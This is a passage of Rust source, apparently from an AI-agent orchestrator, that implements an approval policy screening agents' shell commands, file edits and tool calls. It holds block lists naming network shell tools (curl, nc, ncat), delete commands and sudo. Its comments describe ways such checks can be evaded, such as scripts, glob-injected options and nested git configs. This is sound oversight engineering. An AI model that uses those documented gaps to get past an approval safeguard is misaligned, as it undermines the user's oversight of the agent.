//! Approval policy, level L0 (CRITIQUE D6, agents-backend §5.2): deterministic rules settle
//! the obvious cases before you are asked. The rules read the request, and the disk only to
//! follow symlinks and to see what a command points at (an installed tool, another git
//! repository); the broker glue lives in ingest.rs.
//!
//! Order of the rules:
//! 1. questions and permission changes always go to you;
//! 2. any risk — a provider hint, or one Codly detects (outside the worktree, deletes,
//!    network, push, sudo, git writes, secrets shown to the model, the agent's own CLI
//!    settings changed, unparseable shell) — goes to you, except in full mode for an agent
//!    that is not read-only, where only touching Codly's own data dir or the agent's own CLI
//!    settings still asks;
//! 3. Codly's own MCP tools are allowed in every mode;
//! 4. then the mode: strict asks for everything else; read-only agents get only reads in
//!    every other mode; balanced allows read-only actions, the task's own verify commands and
//!    test runners; autonomous allows anything with no detected risk; full allows everything.
//!
//! Only `allow_once` is ever chosen automatically, never a session or permanent grant.
//!
//! What the rules cannot see: they read the command line, not what a program does. A script,
//! an interpreter (`python x.py`, `node -e …`), `make` or a test the agent wrote can do anything
//! the agent's user account can, so no mode proves that an allowed command stays inside the
//! worktree; only an OS sandbox does (Codex has one).
//!
//! The shell checks err toward asking: a "read-only command" is a bare program name (no path,
//! no `VAR=x` prefix, no wrapper, no `$` expansion) whose arguments use none of its options
//! that write or run something; risks look through wrappers (`timeout 5 git push`) and nested
//! `sh -c`; a word whose value the shell computes (`$HOME/x`) counts as outside the worktree.

use std::path::{Component, Path, PathBuf};
use std::sync::RwLock;

use crate::adapters::classify::{self, ShellRun, first_non_flag, git_read_only, git_sub, has, options, read_only};
use crate::mcp::tools;
use crate::model::*;

pub struct PolicyCtx<'a> {
    pub mode: ApprovalMode,
    /// The agent's working directory: task or solo worktree, repo root for the Lead.
    pub worktree: Option<&'a Path>,
    /// The task's own verify commands (always allowed in balanced mode).
    pub verify: &'a [String],
    /// Lead, reviewers, between-task chats: only reads are ever auto-allowed, in any mode
    /// (the Lead's working directory is the user's own checkout).
    pub read_only: bool,
    /// You trust it to edit on its own (`career::trusts`, Junior): file changes inside the worktree are approved in balanced mode.
    pub edits: bool,
}

#[derive(Debug, Clone, PartialEq)]
pub enum Verdict {
    Allow { choice: ApprovalChoice, rule: String },
    Ask { reason: String },
}

pub fn evaluate(a: &Approval, ctx: &PolicyCtx) -> Verdict {
    let ask = |reason: String| Verdict::Ask { reason };
    match &a.subject {
        ApprovalSubject::Question { .. } => return ask("the agent asked you a question".into()),
        ApprovalSubject::Permissions { .. } => return ask("the agent wants broader permissions".into()),
        _ => {}
    }
    let mut risks = a.risks.clone();
    for r in detect_risks(&a.subject, ctx.worktree) {
        if !risks.contains(&r) {
            risks.push(r);
        }
    }
    let full = ctx.mode == ApprovalMode::Full && !ctx.read_only;
    // The floors full mode keeps. New CLI settings could switch off every later request.
    let floor = |r: &String| r == CODLY_DATA || r == classify::AGENT_SETTINGS;
    if !risks.is_empty() && !(full && !risks.iter().any(floor)) {
        return ask(format!("risk: {}", risks.join(", ")));
    }
    let allow = |rule: String| {
        if a.choices.is_empty() || a.choices.contains(&ApprovalChoice::AllowOnce) {
            Verdict::Allow { choice: ApprovalChoice::AllowOnce, rule }
        } else {
            Verdict::Ask { reason: format!("{rule}, but the agent offered no one-time allow") }
        }
    };
    if let ApprovalSubject::Tool { name, .. } = &a.subject
        && is_codly_tool(name)
    {
        return allow(format!("Codly tool {name}"));
    }
    match ctx.mode {
        ApprovalMode::Strict => ask("strict mode: you approve every action".into()),
        _ if ctx.read_only => match &a.subject {
            ApprovalSubject::Command { command, .. } if classify_command(command, &[]) == Some("read-only command") => {
                allow(format!("read-only command `{}`", short(command)))
            }
            ApprovalSubject::Tool { name, input } if is_read_only_tool(name, input) => allow(format!("read-only tool {name}")),
            _ => ask("this agent is read-only: only reads are approved automatically".into()),
        },
        ApprovalMode::Balanced => match &a.subject {
            ApprovalSubject::Command { command, .. } => match classify_command(command, ctx.verify) {
                Some(kind) => allow(format!("{kind} `{}`", short(command))),
                None => ask("not a read-only command, test runner or verify command".into()),
            },
            ApprovalSubject::Tool { name, input } if is_read_only_tool(name, input) => allow(format!("read-only tool {name}")),
            ApprovalSubject::Tool { name, .. } => ask(format!("tool {name} is not read-only")),
            // No risk was found above, so every path stays inside the worktree.
            ApprovalSubject::FileChange { .. } if ctx.edits && ctx.worktree.is_some() => {
                allow("edits inside its worktree (you trust it to edit on its own)".into())
            }
            _ => ask("balanced mode asks before file changes the CLI did not auto-accept".into()),
        },
        // Not "stays inside the worktree": what a script or program does is not checked.
        ApprovalMode::Autonomous => match ctx.worktree {
            Some(_) => allow("autonomous: no risk detected".into()),
            None => ask("autonomous mode needs a worktree to check paths against".into()),
        },
        ApprovalMode::Full if risks.is_empty() => allow("full access".into()),
        ApprovalMode::Full => allow(format!("full access, despite risk: {}", risks.join(", "))),
    }
}

/// A worker you trust as Senior (`career::trusts`) works autonomously where you chose balanced.
/// Strict and full are explicit choices and stay as they are.
pub fn with_trust(mode: ApprovalMode, trusted: bool) -> ApprovalMode {
    if trusted && mode == ApprovalMode::Balanced { ApprovalMode::Autonomous } else { mode }
}

fn short(s: &str) -> String {
    let one = s.split_whitespace().collect::<Vec<_>>().join(" ");
    if one.chars().count() > 60 { format!("{}…", one.chars().take(59).collect::<String>()) } else { one }
}

/// Codly's own MCP tools, as each CLI names them (`mcp__codly__codly_board` for Claude,
/// `codly_codly_board` for OpenCode…). Only server-qualified names count: a bare
/// `codly_board` could be any MCP server's tool.
pub fn is_codly_tool(name: &str) -> bool {
    let Some(n) = ["mcp__codly__", "codly__", "codly.", "codly/", "codly_"].iter().find_map(|p| name.strip_prefix(p)) else {
        return false;
    };
    [
        tools::GET_TASK,
        tools::BOARD,
        tools::SEARCH,
        tools::MEMORY_SEARCH,
        tools::MEMORY_WRITE,
        tools::KG_QUERY,
        tools::KG_ADD,
        tools::POST_NOTE,
        tools::SUBMIT_PLAN,
        tools::SUBMIT_REPORT,
        tools::ASK_LEAD,
        tools::SUBMIT_REVIEW,
        tools::MESSAGE_MEMBER,
        tools::QUICK_TASK,
        tools::REASSIGN,
        tools::ASK_USER,
    ]
    .contains(&n)
}

/// The protocol `kind` of an ACP tool request (`acp.rs` stores it in the input).
fn acp_kind(input: &serde_json::Value) -> Option<&str> {
    input.get(classify::ACP_KIND).and_then(|k| k.as_str())
}

fn is_read_only_tool(name: &str, input: &serde_json::Value) -> bool {
    /// Tools that read or search files, as Claude and Gemini name them.
    const READS: &[&str] =
        &["read", "glob", "grep", "ls", "notebookread", "read_file", "read_many_files", "list_directory", "search_file_content"];
    /// Titles only ACP agents send.
    const ACP_READS: &[&str] = &["list", "view", "find"];
    /// The agent's own task list.
    const LISTS: &[&str] = &["tasklist", "taskget", "taskcreate", "taskupdate", "todoread", "todowrite"];
    let name = name.to_ascii_lowercase();
    let name = name.as_str();
    LISTS.contains(&name)
        || match acp_kind(input) {
            // An ACP request is named by its title, which is free text (any tool can be titled
            // "read"): the protocol kind must say it reads, too.
            Some(kind) => matches!(kind, "read" | "search") && (READS.contains(&name) || ACP_READS.contains(&name)),
            None => READS.contains(&name),
        }
}

// ───────────────────────────── risks ─────────────────────────────

/// Risks Codly can see in a request (in addition to the provider's own hints).
pub fn detect_risks(subject: &ApprovalSubject, worktree: Option<&Path>) -> Vec<String> {
    let mut risks: Vec<String> = vec![];
    let mut add = |r: &str| {
        if !risks.iter().any(|x| x == r) {
            risks.push(r.to_string());
        }
    };
    let root = worktree.unwrap_or(Path::new(""));
    match subject {
        ApprovalSubject::Command { command, cwd } => {
            let base = cwd.as_deref().map(PathBuf::from).or_else(|| worktree.map(Path::to_path_buf));
            if let (Some(c), Some(w)) = (cwd.as_deref(), worktree)
                && escapes(Path::new(c), w)
            {
                add("outside worktree");
            }
            if cwd.as_deref().is_some_and(|c| private_path(c, None, worktree)) {
                add(CODLY_DATA);
            }
            if let (Some(c), Some(w)) = (cwd.as_deref(), worktree)
                && nested_repo(Path::new(c), w)
            {
                add(NESTED_REPO);
            }
            for r in command_risks(command, base.as_deref(), worktree, 0) {
                add(&r);
            }
        }
        ApprovalSubject::FileChange { paths, diff } => {
            for p in paths {
                if worktree.is_some_and(|w| escapes(&resolve(w, p), w)) {
                    add("outside worktree");
                }
                if private_path(p, worktree, worktree) {
                    add(CODLY_DATA);
                }
                if let Some(why) = classify::guarded_path(p, root) {
                    add(why);
                }
            }
            if diff.as_deref().is_some_and(|d| d.contains("deleted file mode")) {
                add("deletes files");
            }
        }
        ApprovalSubject::Tool { name, input } => {
            let lname = name.to_ascii_lowercase();
            // By name, by ACP kind (a title such as a URL names nothing), or by a `url` to open.
            if ["webfetch", "websearch", "web_fetch", "google_web_search", "fetch"].contains(&lname.as_str())
                || acp_kind(input) == Some("fetch")
                || input.get("url").is_some_and(|u| u.is_string())
            {
                add("network");
            }
            if lname.contains("delete") || lname.contains("remove") {
                add("deletes files");
            }
            for p in input_paths(input) {
                if worktree.is_some_and(|w| escapes(&resolve(w, &p), w)) {
                    add("outside worktree");
                }
                if private_path(&p, worktree, worktree) {
                    add(CODLY_DATA);
                }
                if classify::secret_file(&p) {
                    add(classify::SECRETS);
                }
                if let Some(why) = classify::guarded_path(&p, root).filter(|_| !is_read_only_tool(name, input)) {
                    add(why);
                }
            }
        }
        ApprovalSubject::Question { .. } | ApprovalSubject::Permissions { .. } => {}
    }
    risks
}

fn input_paths(input: &serde_json::Value) -> Vec<String> {
    let mut out = vec![];
    if let Some(obj) = input.as_object() {
        for (k, v) in obj {
            if !["path", "file_path", "filePath", "notebook_path", "paths", "directory", "dir", "cwd", "absolute_path"].contains(&k.as_str()) {
                continue;
            }
            match v {
                serde_json::Value::String(s) => out.push(s.clone()),
                serde_json::Value::Array(a) => out.extend(a.iter().filter_map(|x| x.as_str().map(String::from))),
                _ => {}
            }
        }
    }
    out
}

/// `p` as an absolute path, as written: `escapes` reads it both with `..` taken literally
/// and with symlinks followed.
fn resolve(base: &Path, p: &str) -> PathBuf {
    if p.starts_with('~') {
        return PathBuf::from("/~home"); // never inside a worktree
    }
    let p = Path::new(p);
    if p.is_absolute() { p.to_path_buf() } else { base.join(p) }
}

/// Normalize `.` and `..` without touching the filesystem.
fn lexical(p: &Path) -> PathBuf {
    let mut out = PathBuf::new();
    for c in p.components() {
        match c {
            Component::ParentDir => {
                out.pop();
            }
            Component::CurDir => {}
            other => out.push(other.as_os_str()),
        }
    }
    out
}

/// Directories that are never an agent's, even when its worktree contains them: Codly's
/// data dir (other runs' MCP configs with their tokens, raw logs, the database). Task and solo
/// worktrees live inside it, so only paths outside the agent's own root count.
static PRIVATE_DIRS: RwLock<Vec<PathBuf>> = RwLock::new(Vec::new());

/// Treat `dir` as Codly's own (the Core registers its data dir at start).
pub fn protect_dir(dir: &Path) {
    let mut dirs = PRIVATE_DIRS.write().unwrap_or_else(|e| e.into_inner());
    for d in [lexical(dir), std::fs::canonicalize(dir).map_or_else(|_| lexical(dir), |c| lexical(&c))] {
        if !dirs.contains(&d) {
            dirs.push(d);
        }
    }
}

/// The risk label for touching one of Codly's private dirs: the one floor full mode keeps.
pub const CODLY_DATA: &str = "Codly data";

/// Where `p` leads once symlinks are followed: with `..` taken literally first (as `cd` does)
/// and, when that differs, with each link followed before the `..` after it (as the kernel
/// does when a program opens the path).
fn real_forms(p: &Path) -> Vec<PathBuf> {
    let plain = lexical(p);
    let mut out = vec![classify::real_path(&plain)];
    if plain != p {
        out.push(classify::real_path(p));
    }
    out
}

/// Is `p` outside `root`, or inside one of Codly's private dirs that `root` is not inside?
/// A path that leaves `root` through a symlink (`docs/ref -> ~`) is outside.
fn escapes(p: &Path, root: &Path) -> bool {
    if !lexical(p).starts_with(lexical(root)) || private(p, Some(root)) {
        return true;
    }
    let root = classify::real_path(root);
    real_forms(p).iter().any(|r| !r.starts_with(&root))
}

/// Is `p` inside one of Codly's private dirs, and not inside `root` when `root` (the agent's
/// own worktree) lives in that dir? `p` counts as written and as symlinks resolve it.
fn private(p: &Path, root: Option<&Path>) -> bool {
    let dirs = PRIVATE_DIRS.read().unwrap_or_else(|e| e.into_inner());
    if dirs.is_empty() {
        return false;
    }
    let inside = |p: &Path, root: Option<&PathBuf>| {
        dirs.iter().any(|d| p.starts_with(d) && !root.is_some_and(|r| r.starts_with(d) && p.starts_with(r)))
    };
    inside(&lexical(p), root.map(lexical).as_ref()) || {
        let root = root.map(classify::real_path);
        real_forms(p).iter().any(|r| inside(r, root.as_ref()))
    }
}

/// The risk label for running git where another repository's config applies.
const NESTED_REPO: &str = "nested git repository";

/// Is `dir` inside a git repository other than the worktree's own: below `root`, a bare
/// repository (`HEAD`, `objects/`, `refs/`) or a directory with its own `.git`? git run there
/// reads that repository's config and runs the programs it names (`core.fsmonitor`, filters,
/// `diff.external`), and a cloned repo or the agent itself can put one in the worktree.
fn nested_repo(dir: &Path, root: &Path) -> bool {
    let (dir, root) = (classify::real_path(&lexical(dir)), classify::real_path(root));
    dir.ancestors().take_while(|d| *d != root && d.starts_with(&root)).any(|d| {
        d.join(".git").symlink_metadata().is_ok()
            || (d.join("HEAD").symlink_metadata().is_ok() && d.join("objects").is_dir() && d.join("refs").is_dir())
    })
}

/// `private` for a path as written, relative to `base`, with `~/` and `$HOME/` expanded from
/// the environment (`resolve` treats them as merely "outside").
/// ponytail: other `$VAR`s and `~user` stay unknown and pass in full mode; resolve them if an
/// agent is ever seen reaching the data dir that way.
fn private_path(v: &str, base: Option<&Path>, root: Option<&Path>) -> bool {
    let home = std::env::var("HOME").unwrap_or_default();
    let v = ["~/", "$HOME/", "${HOME}/"].iter().find_map(|p| v.strip_prefix(p)).map_or_else(|| v.to_string(), |r| format!("{home}/{r}"));
    let p = Path::new(&v);
    match base {
        _ if p.is_absolute() => private(p, root),
        Some(b) => private(&b.join(p), root),
        None => false,
    }
}

/// One shell word, with what the shell would do to it that the text alone does not show.
#[derive(Debug, Clone, Default, PartialEq)]
struct Word {
    text: String,
    /// Holds a `$` expansion (unquoted or in double quotes): its value is unknown.
    var: bool,
    /// Starts with an unquoted glob or brace list (`*`, `?x`, `[ab]*`, `{-o,f}`): it may turn
    /// into several words, options included.
    glob: bool,
}

/// A shell command split into simple commands, with what can be checked statically.
#[derive(Debug, Default)]
struct Parsed {
    segments: Vec<Vec<Word>>,
    /// Files written through `>` / `>>` / `&>`.
    writes: Vec<Word>,
    /// Command or process substitution, here-docs, zsh glob qualifiers and `=(…)`: what runs
    /// cannot be checked.
    complex: bool,
}

/// Does `$` followed by `n` expand (`$HOME`, `${x}`, `$'…'`, zsh `$=x`)? `$?`, `$#`, `$$`, `$!`
/// and `$-` are numbers or flags, never paths; a lone `$` is literal.
fn expands(n: char, in_double_quotes: bool) -> bool {
    n.is_ascii_alphanumeric() || "_{@*[=~^+".contains(n) || (!in_double_quotes && (n == '\'' || n == '"'))
}

#[derive(Default)]
struct Lexer {
    p: Parsed,
    cur: Word,
    in_word: bool,
    redirect: bool,
    /// The current word's first character, when it was not quoted.
    lead: Option<char>,
}

impl Lexer {
    fn push(&mut self, c: char, quoted: bool) {
        if !quoted && self.cur.text.is_empty() && self.lead.is_none() {
            self.lead = Some(c);
        }
        self.in_word = true;
        self.cur.text.push(c);
    }

    fn flush(&mut self) {
        let lead = self.lead.take();
        if !self.in_word {
            return;
        }
        self.in_word = false;
        let mut w = std::mem::take(&mut self.cur);
        let t = w.text.as_str();
        match lead {
            Some('*' | '?') => w.glob = true,
            Some('[') if t.len() > 1 && t.contains(']') => w.glob = true,
            Some('{') if t.contains(',') || t.contains("..") => w.glob = true,
            // zsh `=cmd` expands to the command's path
            Some('=') if t[1..].starts_with(|c: char| c.is_ascii_alphanumeric() || c == '_') => w.var = true,
            _ => {}
        }
        if std::mem::take(&mut self.redirect) {
            self.p.writes.push(w);
        } else if let Some(seg) = self.p.segments.last_mut() {
            seg.push(w);
        }
    }

    fn split(&mut self) {
        self.flush();
        self.p.segments.push(vec![]);
    }
}

fn parse(cmd: &str) -> Parsed {
    let mut lx = Lexer { p: Parsed { segments: vec![vec![]], ..Default::default() }, ..Default::default() };
    let mut it = cmd.chars().peekable();
    while let Some(c) = it.next() {
        match c {
            '\'' => {
                lx.in_word = true;
                for c in it.by_ref() {
                    if c == '\'' {
                        break;
                    }
                    lx.push(c, true);
                }
            }
            '"' => {
                lx.in_word = true;
                while let Some(c) = it.next() {
                    match c {
                        '"' => break,
                        '\\' => {
                            if let Some(n) = it.next() {
                                lx.push(n, true);
                            }
                        }
                        '`' => lx.p.complex = true,
                        '$' if it.peek() == Some(&'(') => lx.p.complex = true,
                        '$' => {
                            lx.cur.var |= it.peek().is_some_and(|n| expands(*n, true));
                            lx.push('$', true);
                        }
                        _ => lx.push(c, true),
                    }
                }
            }
            '\\' => {
                lx.in_word = true;
                if let Some(n) = it.next()
                    && n != '\n'
                {
                    lx.push(n, true);
                }
            }
            '`' => lx.p.complex = true,
            '$' if it.peek() == Some(&'(') => lx.p.complex = true,
            '$' => {
                lx.cur.var |= it.peek().is_some_and(|n| expands(*n, false));
                lx.push('$', false);
            }
            ' ' | '\t' => lx.flush(),
            '>' => {
                // "2>file" / "2>&1": a leading fd number is not a word.
                if lx.in_word && !lx.cur.text.is_empty() && lx.cur.text.chars().all(|c| c.is_ascii_digit()) {
                    lx.cur = Word::default();
                    lx.lead = None;
                    lx.in_word = false;
                } else {
                    lx.flush();
                }
                if it.peek() == Some(&'>') {
                    it.next();
                }
                match it.peek() {
                    Some('&') => {
                        it.next();
                        while it.peek().is_some_and(|c| c.is_ascii_digit() || *c == '-') {
                            it.next();
                        }
                    }
                    Some('(') => lx.p.complex = true,
                    _ => lx.redirect = true,
                }
            }
            '<' => {
                lx.flush();
                if matches!(it.peek(), Some('<') | Some('(')) {
                    lx.p.complex = true;
                }
            }
            '&' if it.peek() == Some(&'>') => {
                lx.flush();
                it.next();
                if it.peek() == Some(&'>') {
                    it.next();
                }
                lx.redirect = true;
            }
            '\n' | ';' | '|' | '&' | ')' => lx.split(),
            // Inside a word, `(` starts a zsh glob qualifier (`*(e:cmd:)` runs code), `=(…)`
            // or an extglob: nothing that can be checked.
            '(' if lx.in_word => lx.p.complex = true,
            '(' => lx.split(),
            // `{ …; }` is a group; `{a,b}` and `{}` are words.
            '{' | '}' if !lx.in_word && it.peek().is_none_or(|n| n.is_whitespace() || *n == ';') => lx.split(),
            _ => lx.push(c, false),
        }
    }
    lx.flush();
    let mut p = lx.p;
    p.segments.retain(|s| !s.is_empty());
    p
}

fn basename(p: &str) -> &str {
    p.rsplit('/').next().unwrap_or(p)
}

/// `--package=x` / `-p x` on npx, bunx or `npm exec`: installs and runs that registry package.
fn package_flag(args: &[String]) -> bool {
    options(args).any(|a| a.starts_with("--package") || (a.starts_with("-p") && !a.starts_with("--")))
}

/// `npx -c 'cmd'` / `npm exec --call 'cmd'`: runs a shell command string.
fn call_flag(args: &[String]) -> bool {
    options(args).any(|a| a == "-c" || a.starts_with("--call"))
}

/// Directories a git command is pointed at before its subcommand, seen from `start`: each
/// `-C dir` (relative to the one before), `--git-dir` and `--work-tree`.
fn git_dirs(args: &[String], start: &Path) -> Vec<PathBuf> {
    let (mut cur, mut out, mut i) = (start.to_path_buf(), vec![], 0);
    while let Some(a) = args.get(i).map(String::as_str).filter(|a| a.starts_with('-')) {
        let next = args.get(i + 1);
        match a {
            "-C" => {
                if let Some(d) = next {
                    cur.push(d);
                    out.push(cur.clone());
                }
            }
            "--git-dir" | "--work-tree" => out.extend(next.map(|d| cur.join(d))),
            _ => out.extend(["--git-dir=", "--work-tree="].iter().find_map(|f| a.strip_prefix(f)).map(|d| cur.join(d))),
        }
        i += if matches!(a, "-C" | "-c" | "--git-dir" | "--work-tree" | "--namespace") { 2 } else { 1 };
    }
    out
}

const NETWORK: &[&str] =
    &["curl", "wget", "ssh", "scp", "sftp", "rsync", "nc", "ncat", "netcat", "telnet", "ftp", "http", "https", "aria2c", "gh"];
const DELETES: &[&str] = &["rm", "rmdir", "unlink", "shred", "srm", "trash"];
const HARMLESS_PATHS: &[&str] = &["/dev/null", "/dev/stdout", "/dev/stderr"];

/// Values a word may stand for: each alternative of its brace lists (`{a,/etc/x}`,
/// `src/{a,b}/x`) and, for each, an option's value glued to its flag (`-f/etc/hosts`,
/// `--file=/etc/hosts`, `FOO=~/x`) and the `~` entries of a `:` list (`PATH=x:~/bin`). None
/// when the alternatives are too many to list: the word may name anything.
fn path_candidates(t: &str) -> Option<Vec<String>> {
    let mut out = vec![];
    for t in classify::braces(t)? {
        if let Some((_, v)) = t.split_once('=') {
            out.push(v.to_string());
        }
        if t.starts_with('-') {
            let v = t.trim_start_matches('-').trim_start_matches(|c: char| c.is_ascii_alphabetic());
            if !v.is_empty() {
                out.push(v.to_string());
            }
        }
        out.extend(t.split(':').skip(1).filter(|p| p.starts_with('~')).map(str::to_owned));
        out.push(t);
    }
    Some(out)
}

fn path_outside(v: &str, base: Option<&Path>, root: Option<&Path>) -> bool {
    if v.starts_with('~') {
        return true; // `~`, `~/x`, `~user/x`
    }
    if HARMLESS_PATHS.contains(&v) {
        return false;
    }
    match (base, root) {
        (Some(base), Some(root)) => escapes(&resolve(base, v), root),
        _ => v.starts_with('/'),
    }
}

/// Could this argument name something outside the worktree? A `$` expansion is unknown, so
/// it could (`cat $HOME/.profile`).
fn word_outside(w: &Word, base: Option<&Path>, root: Option<&Path>) -> bool {
    w.var || path_candidates(&w.text).is_none_or(|values| values.iter().any(|v| path_outside(v, base, root)))
}

/// The same for a command name: `/usr/bin/git` is fine, `~/bin/x`, `../../x.sh` and `$X` are not.
fn program_outside(w: &Word, base: Option<&Path>, root: Option<&Path>) -> bool {
    w.var || w.text.starts_with('~') || (w.text.contains("..") && path_outside(&w.text, base, root))
}

fn command_risks(cmd: &str, cwd: Option<&Path>, worktree: Option<&Path>, depth: u8) -> Vec<String> {
    let p = parse(cmd);
    let mut risks = vec![];
    let mut add = |r: &str| {
        if !risks.iter().any(|x: &String| x == r) {
            risks.push(r.to_string());
        }
    };
    if p.complex {
        add("command substitution or shell expansion (cannot be checked)");
    }
    let base = cwd.or(worktree);
    let root = worktree.unwrap_or(Path::new(""));
    let codly_data = |w: &Word| path_candidates(&w.text).is_none_or(|values| values.iter().any(|v| private_path(v, base, worktree)));
    for w in &p.writes {
        if word_outside(w, base, worktree) {
            add("outside worktree");
        }
        if codly_data(w) {
            add(CODLY_DATA);
        }
        for why in classify::guarded_word(&w.text, root) {
            add(why);
        }
    }
    // Where the next simple command runs: `cd` moves it.
    let mut dir = base.map(Path::to_path_buf);
    for seg in &p.segments {
        let texts: Vec<String> = seg.iter().map(|w| w.text.clone()).collect();
        let start = classify::command_start(&texts);
        let at = start.unwrap_or(texts.len());
        for (k, w) in seg.iter().enumerate() {
            let command_word = k == at || (k < at && classify::is_wrapper(&w.text));
            if if command_word { program_outside(w, base, worktree) } else { word_outside(w, base, worktree) } {
                add("outside worktree");
            }
            if codly_data(w) {
                add(CODLY_DATA);
            }
        }
        if texts[..at].iter().any(|w| matches!(basename(w), "sudo" | "doas")) {
            add("sudo");
        }
        let Some(start) = start else {
            add("runs dynamic code"); // `env -S 'git push'`
            continue;
        };
        let Some(first) = seg.get(start) else {
            // `env` with no command prints the environment
            if texts.iter().any(|t| basename(t) == "env") {
                add(classify::SECRETS);
            }
            continue;
        };
        if first.var || first.glob {
            add("runs dynamic code"); // `$CMD args`: the program itself is unknown
            continue;
        }
        let prog = basename(&first.text).to_string();
        let args = &texts[start + 1..];
        // `cd`, `cd -`, `pushd`, `popd` without a directory go home or back: outside.
        if matches!(prog.as_str(), "cd" | "pushd" | "popd") && args.iter().all(|a| a.starts_with('-')) {
            add("outside worktree");
        }
        if matches!(prog.as_str(), "cd" | "pushd")
            && let (Some(d), Some(to)) = (dir.as_mut(), args.iter().find(|a| !a.starts_with('-')))
        {
            d.push(to);
            if worktree.is_some_and(|w| nested_repo(d.as_path(), w)) {
                add(NESTED_REPO);
            }
        }
        // `GIT_DIR=sub git status` points git at another repository, as `--git-dir` does.
        if let (Some(d), Some(w)) = (dir.as_deref(), worktree)
            && texts[..start].iter().filter_map(|t| t.strip_prefix("GIT_DIR=")).any(|g| nested_repo(&d.join(g), w))
        {
            add(NESTED_REPO);
        }
        // Programs that run other programs: check what they run.
        let mut runs: Vec<(String, Vec<String>)> = vec![(prog.clone(), args.to_vec())];
        if prog == "find"
            && let Some(i) = args.iter().position(|a| ["-exec", "-execdir", "-ok", "-okdir"].contains(&a.as_str()))
            && let Some(x) = args.get(i + 1)
        {
            runs.push((basename(x).to_string(), args[i + 2..].to_vec()));
        }
        // Does `npx <args>` run a tool the project has installed, seen from where it runs?
        let npx_local = |args: &[String]| dir.as_deref().is_some_and(|d| classify::npx_runs_local(args, d, root));
        for (prog, args) in runs {
            let a = args.as_slice();
            for r in classify::exposure(&prog, a, root) {
                add(r);
            }
            match prog.as_str() {
                "sudo" | "doas" | "su" => add("sudo"),
                p if DELETES.contains(&p) => add("deletes files"),
                "find" if has(a, &["-delete"]) => add("deletes files"),
                p if NETWORK.contains(&p) => add("network"),
                "chmod" | "chown" | "chgrp" if has(a, &["-R", "--recursive"]) => add("changes permissions recursively"),
                "dd" | "mkfs" | "diskutil" | "fdisk" => add("disk"),
                "kill" | "pkill" | "killall" | "launchctl" | "systemctl" | "shutdown" | "reboot" => add("system"),
                "docker" | "podman" => add("containers"),
                "eval" | "source" | "." => add("runs dynamic code"),
                p if classify::SHELLS.contains(&p) => match classify::shell_run(a) {
                    ShellRun::Command(inner) if depth < 3 => {
                        for r in command_risks(inner, cwd, worktree, depth + 1) {
                            add(&r);
                        }
                    }
                    ShellRun::Command(_) => add("runs dynamic code"),
                    ShellRun::Stdin => add("pipes into a shell"),
                    ShellRun::Script => {}
                },
                "git" => {
                    if let (Some(d), Some(w)) = (dir.as_deref(), worktree)
                        && git_dirs(a, d).iter().any(|g| nested_repo(g, w))
                    {
                        add(NESTED_REPO);
                    }
                    let (sub, rest) = git_sub(a);
                    match sub.unwrap_or("") {
                        "push" => add("push"),
                        "fetch" | "pull" | "clone" | "ls-remote" | "submodule" => add("network"),
                        "clean" => add("deletes files"),
                        "reset" if has(rest, &["--hard"]) => add("discards changes"),
                        "restore" | "checkout" if rest.iter().any(|x| x == "--" || x == ".") => add("discards changes"),
                        s if !git_read_only(s, rest) => add("git write (Codly commits and merges for you)"),
                        _ => {}
                    }
                }
                "npm" | "pnpm" | "yarn" | "bun" => match first_non_flag(a).unwrap_or("") {
                    "publish" => add("publish"),
                    "install" | "i" | "add" | "ci" | "update" | "upgrade" | "up" | "remove" | "rm" | "uninstall" | "dlx" | "x"
                    | "create" => add("network (package install)"),
                    "exec" if package_flag(a) => add("network (package install)"),
                    "exec" if call_flag(a) => add("runs dynamic code"),
                    // `npm exec` is npx: it downloads what the project does not have (pnpm and
                    // yarn only run what is installed).
                    "exec" if prog == "npm" && !npx_local(a.split(|x| x == "exec").nth(1).unwrap_or_default()) => add("network (npx)"),
                    _ => {}
                },
                "npx" | "bunx" if !npx_local(a) => add("network (npx)"),
                "pip" | "pip3" | "poetry" | "uv" | "pipx" | "gem" | "bundle" | "brew" | "apt" | "apt-get" | "yum" | "dnf" | "composer" => {
                    let sub = first_non_flag(a);
                    if sub.is_some_and(|x| {
                        ["install", "add", "update", "upgrade", "sync", "lock", "require", "remove", "uninstall", "pip", "tool"]
                            .contains(&x)
                    }) || (prog == "pipx" && sub == Some("run"))
                        || (prog == "uv" && classify::uv_run_fetches(a))
                    {
                        add("network (package install)");
                    }
                }
                // uvx runs a package from PyPI; tox and nox install what their config lists.
                "uvx" | "tox" | "nox" => add("network (package install)"),
                "cargo" if first_non_flag(a).is_some_and(|x| ["install", "add", "publish", "remove", "update", "login"].contains(&x)) => {
                    add("network (package install)")
                }
                "go" if first_non_flag(a).is_some_and(|x| ["get", "install"].contains(&x)) => add("network (package install)"),
                _ => {}
            }
        }
    }
    risks
}

// ───────────────────────────── balanced mode ─────────────────────────────

/// Test runners and checkers that are not npm packages (those are `classify::NPX_RUNNERS`):
/// behind npx their name would fetch whatever package holds it on the registry. tox and nox
/// are not here: they install what their config lists.
const RUNNERS: &[&str] = &[
    "pytest",
    "py.test",
    "rspec",
    "phpunit",
    "ctest",
    "mypy",
    "ruff",
    "flake8",
    "pylint",
    "black",
    "isort",
    "golangci-lint",
    "staticcheck",
    "swiftlint",
    "shellcheck",
];

/// A test runner or checker, as the program itself or behind `pnpm exec`, `uv run`…
fn is_runner(name: &str) -> bool {
    RUNNERS.contains(&name) || classify::NPX_RUNNERS.contains(&name)
}

/// Script names (`npm run <x>`) that are checks rather than arbitrary code.
fn check_script(s: &str) -> bool {
    ["test", "lint", "typecheck", "type-check", "check", "build", "tsc", "verify", "ci"]
        .iter()
        .any(|p| s == *p || s.starts_with(&format!("{p}:")) || s.starts_with(&format!("{p}-")))
}

/// Programs whose options can neither write files nor run commands, so an argument the shell
/// expands (`*`, `{a,b}`) cannot turn them into anything else (a file named `--pre=sh` makes
/// `rg x *` run every file through `sh`).
const GLOB_SAFE: &[&str] = &[
    "ls", "cat", "head", "tail", "wc", "grep", "egrep", "fgrep", "stat", "du", "nl", "strings", "cksum", "md5", "md5sum", "sha1sum",
    "sha256sum", "shasum", "echo",
];

/// Why a command is safe to auto-allow in balanced mode, if it is.
pub fn classify_command(cmd: &str, verify: &[String]) -> Option<&'static str> {
    let trimmed = cmd.trim();
    if verify.iter().any(|v| v.trim() == trimmed) {
        return Some("verify command");
    }
    let p = parse(cmd);
    if p.complex || p.writes.iter().any(|w| w.var || w.text != "/dev/null") || p.segments.is_empty() {
        return None;
    }
    let mut kind = "read-only command";
    for seg in &p.segments {
        let (first, rest) = seg.split_first()?;
